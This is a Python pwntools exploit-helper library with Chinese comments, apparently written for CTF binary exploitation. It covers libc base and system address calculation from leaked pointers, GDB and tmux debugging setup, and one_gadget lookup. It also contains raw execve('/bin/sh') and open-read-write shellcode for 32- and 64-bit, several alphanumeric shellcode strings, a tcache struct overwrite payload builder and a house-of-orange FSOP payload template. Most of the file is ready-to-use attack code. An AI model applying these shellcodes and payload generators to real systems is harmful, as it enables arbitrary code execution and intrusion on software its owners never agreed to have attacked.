from ast import arg
from pwn import *
from LibcSearcher import *
import sys
import os
import re
from subprocess import check_output

def long_search(target_vul, leak_addr):
    obj = LibcSearcher(target_vul, leak_addr)
    libc_base = leak_addr - obj.dump(target_vul)
    sys_addr = libc_base + obj.dump('system')
    bin_sh_addr = libc_base + obj.dump('str_bin_sh')
    log('libc_base',hex(libc_base))
    log('sys_addr',hex(sys_addr))
    log('bin_sh_addr',hex(bin_sh_addr))
    return sys_addr, bin_sh_addr


def local_search(target_vul, leak_addr, libc):
    libc_base = leak_addr - libc.symbols[target_vul]
    sys_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))
    log('libc_base', hex(libc_base))
    log('sys_addr',hex(sys_addr))
    log('bin_sh_addr',hex(bin_sh_addr))
    return sys_addr, bin_sh_addr

def log(message,value):
    print("\033["+"0;30;41m"+message+"\033[0m"+
          "\033["+str(91)+"m"+" ===============> "+
          "\033[0m","\033["+"0;30;43m"+value+"\033[0m")

def log_addr(message : str):
    assert isinstance(message,str),'The parameter passed in should be of type str'
    variable= sys._getframe(1).f_locals.get(message)
    assert isinstance(variable,int),'Variable should be of type int'
    log(message,hex(variable))
    
def log_info(message):
    print("\033[1;31m[\033[0m"+"\033[1;32m*\033[0m"+"\033[1;31m]\033[0m  ",message)  
    

def debug(p,*args):
    try:
        if len(sys.argv)==2:
            return
    except:
        pass
    if not args:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(p)
        os.system('tmux select-pane -L')
        os.system('tmux split-window')
        os.system('tmux set mouse on')
        return
    if args[0]=='no-tmux':
        if args[1]=='pie':
            list=[]
            for i in range(2,len(args)):
                demo = "b * $rebase(0x{:x})\n ".format(args[i])
                list.append(demo)
                info = "".join(list)
            gdb.attach(p, info)
        else:
            list=[]
            for i in range(1,len(args)):
                demo = "b * 0x{:x}\n ".format(args[i])
                list.append(demo)
            info = "".join(list)
            gdb.attach(p,info)
    else:
        if args[0]=='pie':
            list=[]
            for i in range(1,len(args)):
                demo = "b * $rebase(0x{:x})\n ".format(args[i])
                list.append(demo)
                info = "".join(list)
            context.terminal = ['tmux', 'splitw', '-h']
            gdb.attach(p,info)
            os.system('tmux select-pane -L')
            os.system('tmux split-window')
            os.system('tmux set mouse on')
        else:
            list=[]
            for i in range(len(args)):
                demo = "b * 0x{:x}\n ".format(args[i])
                list.append(demo)
            info = "".join(list)
            context.terminal = ['tmux', 'splitw', '-h']
            gdb.attach(p,info)
            os.system('tmux select-pane -L')
            os.system('tmux split-window')
            os.system('tmux set mouse on')

def load(program_name, ip_port="", remote_libc=""):

    global libc_info
    global p
    global framework

    framework = pretreatment_arch(program_name)#判断程序架构

    program_path = os.path.abspath(program_name)
    recv = os.popen('ldd ' + program_path).read()

    if "not a dynamic executable" in recv:#判断是否为静态链接
        if ip_port == "":
            p = process('./' + program_name)
        else:
            if ":" in ip_port:
                par_list = ip_port.split(":", 1)
                p = remote(par_list[0], par_list[1])
                return p
            p = remote(ip_port)
        return p

    """如果程序是动态链接，那就去获取程序的libc信息"""
    rule_version = r"libc-2\.[0-9][0-9]\.so"
    version = re.findall(rule_version, recv)
    if version:
        rule_info = r"\t(.*?)" + version[0] + " \(0x"
        info = re.findall(rule_info, recv)
        libc_info = info[0] + version[0]
    else:
        rule_info = r"libc.so.6 => (.*?) \(0x"
        info = re.findall(rule_info, recv)
        libc_info = info[0]

    if remote_libc!="" and ip_port != "" and (len(sys.argv) == 2 and sys.argv[1] == str(1)):
        libc_info=remote_libc
    log('libc_info', libc_info)
    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1] == str(2)):
        """如果打本地的话(命令行参数没有或者为2)，就返回如下"""
        p = process('./' + program_name)
        e = ELF('./' + program_name)
        libc = ELF(libc_info)
        return p, e, libc

    if ip_port != "" and (len(sys.argv) == 2 and sys.argv[1] == str(1)):
        """如果打远程的话(命令行参数为1)并且存在ip_port"""
        """再去判断是否存在远程的libc版本,如果有的话，就直接去装载对应的libc版本"""
        """这种情况是应对打远程和本地的小版本libc不一样的情况，比如one_gadget或者某些函数的偏移有细微差异，从而可以更快的去进行切换"""
        if ":" in ip_port:
            par_list = ip_port.split(":", 1)
            p = remote(par_list[0], par_list[1])
            e = ELF('./' + program_name)
            if remote_libc!="":
                libc=ELF(remote_libc)
            else:
                libc=ELF(libc_info)
            return p, e, libc

def shellcode_store(demand):
    if demand =='shell_64':
        shellcode=b"\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05"
        return shellcode
    elif demand=='shell_32':
        shellcode=b"\x31\xC9\x31\xD2\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC0\x6A\x0B\x58\xCD\x80"
        return shellcode
    elif demand=='orw_64':
        shellcode=b"\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
        return shellcode
    elif demand=='orw_32':
        shellcode=b"\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80"
        return shellcode
    elif demand=='str_rsp':
        shellcode="Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand=='str_esp':
        shellcode="TYhffffk4diFkDql02Dqm0D1CuEE2O0Z2G7O0u7M041o1P0R7L0Y3T3C1l000n000Q4q0f2s7n0Y0X020e3j2r1k0h0i013A7o4y3A114C1n0z0h4k4r0y07"
        return shellcode
    elif demand=='str_rdi':
        shellcode="Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
        return shellcode
    elif demand=='str_rsi':
        shellcode="Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand=='str_rax':
        shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
        return shellcode
    elif demand=='str_rbp':
        shellcode="Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand=='str_rbx':
        shellcode="Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    elif demand=='str_rcx':
        shellcode="Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
        return shellcode
    else:
        assert False,"Pass in unrecognized parameter"

def search_og(index):
    global libc_info
    recv = os.popen('one_gadget '+libc_info).read()
    p1 = re.compile(r"(.*exec)")
    c = re.findall(p1,recv)
    log_info(recv)
    one_gadget_list=[int(i[:-5],16) for i in c ]
    return one_gadget_list[index]

def recv_libc():
    global p
    global framework
    if framework=='amd64':    
        recv_libc_addr=u64(p.recvuntil(b'\x7f',timeout=1)[-6:].ljust(8,b'\x00'))
        log_addr('recv_libc_addr')
    if framework=='i386':
        recv_libc_addr=u32(p.recvuntil(b'\xf7')[-4:])
        log_addr('recv_libc_addr') 
    return recv_libc_addr       

def pretreatment_arch(program_name):
    """获取程序的位数"""
    global framework
    program_path = os.path.abspath(program_name)
    recv = os.popen('file ' + program_path).read()  # 执行file命令，来对获取的数据进行处理，以来判断程序的位数
    if '64-bit' in recv:
        framework = 'amd64'
    elif '32-bit' in recv:
        framework = 'i386'
    else:
        print('It may not be an ELF file, its type is {}'.format(recv))
        exit()
    log('The framework of the program is:',framework)
    return framework

def p(address):
    global framework
    if framework=='amd64':
        return p64(address)
    elif framework=='i386':
        return p32(address)
    
def tcache_struct_attack(writes:list,address={}):
    """这个函数目前只适用于2.27的libc版本中"""
    """两个参数都为列表 第一个必须要有 第二个则可以没有"""
    """如果我们想将0x110这条tcache链的counts改成7,那我们将第一个参数写为{0x110:7}即可"""
    """第二个参数是用来篡改某条链表的头指针，比如篡改0x120这条链的头指针为0xdeadbeef 则写成{0x120:0xdeadbeef}"""
    count_list=[]
    payload=b''
    size=0x20
    i=0
    flag=0
    while(0x410>=size):
        if i==len(writes):
            break
        for key in writes:
            if size==key:
                count_list.append(writes[key].to_bytes(1,byteorder='little', signed=False))
                i=i+1
                flag=1  
        if flag==0:
            count_list.append((b'\x00'))
        size=size+0x10
        flag=0
    payload=b''.join(count_list)
    if address:
        payload.ljust(0x40,b'\x00')
        size=0x20
        i=0
        flag=0
        address_list=[]
        while(0x410>=size):
            if i==len(address):
                break
            for key in address:
                if size==key:
                    address_list.append(p(address[key]))
                    i=i+1
                    flag=1
            if flag==0:
                address_list.append(p(0))
            size=size+0x10
            flag=0
        payload=payload.join(address_list)
    return payload

def orange_attack(libc_base:int,heap_addr:int,fill_data,libc)->bytes:
    '''
    在house of orange攻击中，如果获取了libc地址和堆地址，并且让堆块进入unsorted bin中
    后续的攻击较为模板化，因此将后面的payload模板化
    使用该函数最需要注意的就是heap_addr必须要是在unsorted bin中的那个堆块地址

    :param libc_base: libc基地址
    :param heap_addr: 在unsorted bin中的堆块地址
    :param fill_data: 因为我们是溢出来控制的堆块数据，这个fill_data是覆盖正常堆块的数据
    假设正常堆块size为0x400，我们通过正常堆块溢出到它下面位于unsorted bin中的堆块，那么fill_data为0x400
    :param libc: 该参数就是程序所依赖的libc库，用于之后在libc中搜索需要的符号表
    :return: 构造好的payload
    '''
    sys_addr = libc_base + libc.symbols['system']
    io_list_all = libc_base + libc.symbols['_IO_list_all']

    payload = b'a' * fill_data
    payload += b'/bin/sh\x00' + p64(0x61)  # old top chunk prev_size & size 同时也是fake stdout的_flags字段
    payload += p64(0) + p64(io_list_all - 0x10)  # old top chunk fd & bk  覆盖bk，进行unsorted bin attack
    payload += p64(0) + p64(1)  # _IO_write_base & _IO_write_ptr
    payload += p64(0) * 7
    payload += p64(heap_addr)  # chain
    payload += p64(0) * 13
    payload += p64(heap_addr+0xd8) #vtable
    payload += p64(0) + p64(0) + p64(sys_addr)#sys_addr为 __overflow字段
    return payload